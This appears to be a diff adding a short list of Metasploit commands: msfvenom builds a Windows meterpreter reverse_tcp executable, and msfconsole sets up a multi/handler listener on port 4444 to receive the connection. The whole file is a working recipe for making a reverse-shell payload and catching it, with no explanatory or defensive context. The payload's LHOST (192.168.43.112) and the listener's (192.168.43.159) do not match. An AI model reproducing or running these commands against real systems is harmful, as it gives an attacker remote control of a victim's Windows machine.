@@ -1,0 +1,9 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.43.112 LPORT=4444 -f exe > payload.exe
+mv payload.exe /root/Desktop
+
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 192.168.43.159
+set LPORT 4444
+show options
